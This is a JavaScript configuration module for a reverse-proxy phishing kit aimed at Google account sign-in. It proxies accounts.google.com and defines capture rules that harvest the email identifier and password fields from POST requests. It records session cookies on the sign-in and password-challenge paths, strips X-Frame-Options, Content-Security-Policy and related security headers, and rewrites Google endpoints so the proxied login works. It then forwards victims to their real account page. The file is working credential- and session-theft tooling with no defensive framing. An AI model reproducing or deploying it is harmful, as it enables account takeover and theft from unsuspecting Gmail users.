/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        // Simple approach like working services - let the base class handle captures
        return super.processRequest()
    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: '/playboy',
            },
            {
               reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
               replacement: '/CheckConnection',
            },
           {
               reg: /name="checkConnection" value/gi,
               replacement: 'name="checkConnection" value="youtube:1052:1"',
           },
           {
               reg: /signaler-pa.googleapis.com/gi,
               replacement: 'localhost',
           }
        ]
    }

    processResponse(clientContext) {
        // Simple response handling like working services
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')

        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        return super.processResponse(clientContext)
    }

    concludeAuth() {
        console.log('logged in fine please')
    }
}

const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        return super.execute(clientContext)
    }
}

const configExport = {
    SCHEME: 'gmail',

    CURRENT_DOMAIN: 'accounts.google.com',

    AUTOGRAB_CODE: 'identifier',

    START_PATH: '/v3/signin/identifier?hl=en',

    COOKIE_PATH: ['/v3/signin/identifier', '/v3/signin/challenge/pwd'],

    EXIT_TRIGGER_PATH: [],

    EXIT_URL: 'https://myaccount.google.com/',

    EXTRA_COMMANDS: [
        
        {
            path: '/recaptcha/releases.*',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'www.gstatic.com',
                persistent: false,
                },
        },

    ],


    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,



    CAPTURES: {
        gmailEmail: {
            method: 'POST',
            params: ['identifier'],
            urls: '',
            hosts: ['accounts.google.com'],
        },

        gmailPassword: {
            method: 'POST',
            params: ['password', 'hiddenPassword'],
            urls: '',
            hosts: ['accounts.google.com'],
        },
    },

    //MODULE OPTIONS 
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: this.START_PATH,
        exitLink: '',
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport